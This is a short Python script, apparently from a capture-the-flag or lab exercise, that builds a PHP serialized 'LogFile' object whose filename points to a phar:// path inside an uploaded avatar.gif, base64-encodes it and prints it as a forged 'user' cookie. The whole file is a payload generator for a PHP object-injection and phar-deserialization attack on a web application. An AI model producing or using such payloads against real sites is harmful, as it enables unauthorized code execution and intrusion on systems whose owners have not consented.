import base64

phar = "phar://upload/testq/avatar.gif/a"
length = len(phar.encode("utf-8"))

ser = f'O:7:"LogFile":1:{{s:8:"filename";s:{length}:"{phar}";}}'
cookie_val = base64.b64encode(ser.encode()).decode()

print("Cookie user =", cookie_val)
